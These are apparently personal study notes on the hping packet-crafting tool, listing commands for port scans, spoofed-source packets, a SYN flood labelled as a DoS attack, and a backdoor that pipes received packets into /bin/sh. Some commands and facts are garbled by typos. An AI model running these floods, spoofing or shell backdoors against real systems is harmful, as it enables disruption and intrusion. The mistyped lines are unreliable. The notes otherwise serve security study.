---
title: Meow's Testing Tools - hping
date: 2019-09-17 11:11:11 -0400
categories: [10CyberAttack, CyberAttackTools]
tags: [CyberAttack, CyberAttackTools]
toc: true
image:
---

# hping

[toc]

---

# Hping
- Hping (Hping2 or Hping3) is another powerful tool for both ping sweeps and port scans
  - a handy packet-crafting tool for TCP/IP.
  - works on Windows and Linux versions
  - runs nearly any scan Nmap can put out.
  - downside, command-line-only tool.


- a command-line TCP/IP packet assembler and analyzer tool
- send customized TCP/IP packets and display the target reply as ping command display the `ICMP Echo Reply packet` from targeted host.
- Hping can also handle fragmentation, arbitrary packets body, and size and file transfer.
- It supports `TCP, UDP, ICMP and RAW-IP` protocols.
- Using Hping, the following parameters can be performed:
  - Test firewall rules.
  - Advanced port scanning.
  - Testing net performance.
  - Path MTU discovery.
  - Transferring files between even fascist firewall rules.
  - Traceroute-like under different protocols.
  - Remote OG fingerprinting & others.

￼![Screen Shot 2019-12-02 at 14.38.32](https://i.imgur.com/dLaXTxs.png)
￼
`-i` –interval wait (uX for X microseconds, for example -i u1000)

Modede

fault mode TCP
- `-0`: RAW IP mode
- `-1`: ICMP mode
- `-2`: UDP mode
- `-8`: SCAN mode.
- `-9`: listen mode

![page91image152294272](https://i.imgur.com/xEaDBuv.jpg)


- Hping 設定SYN Flag, (收到SYC/ACK代表Port有開)
  - 目標怎麼回代表防火牆是open
  - `Hping 10.1.1.1 –c2 –S(SYN) –p21 -n`
  - *Port open*：`SYN/ACK`
  - *Port closed*：`ICMP Unreachable type 13`  *packet filter firewall*

---

## Example

`hpings –A IP` create an ACK packet:

![Pasted Graphic 4](https://i.imgur.com/Q53gnqB.png)

`hpings -8 1-600 –S IP`: create GVN scan against different ports:

￼![Pasted Graphic 5](https://i.imgur.com/fNu5d8z.png)

spoof source IP addresses and source ports.
`hping3 -a 10.8.8.8 -S  springfield   -c 2 -p 80`

Dos Attack:
`hping3 -i ul -S -p 80 192.168.1.10`

Pings (ICMP echo requests) being blocked:
`hping3 -S  www.baidu.ss -p 80`


Uptime: `hping2 -p 80 -S --tcp-timestamp host`

PortScan: `hping –I eth0 --scan 20-25,80,443 -S host`

Synflood: `hping –p 80 –i u10000 –a source –S host`


Backdoor:

S-: `hping3 -I eth1 -9 secret | /bin/sh`

C-: `hping3 -R ip -e secret -E command_file -d 100 -c 1`










.
